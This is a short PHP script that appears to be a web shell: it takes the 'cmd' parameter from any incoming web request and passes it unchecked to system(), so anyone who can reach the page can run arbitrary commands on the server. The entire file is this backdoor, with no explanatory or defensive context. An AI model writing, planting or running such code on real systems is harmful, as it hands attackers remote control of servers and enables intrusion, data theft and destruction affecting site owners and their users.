<?php

if (isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']);
} else {
    echo "Use the cmd parameter!";
}

?>
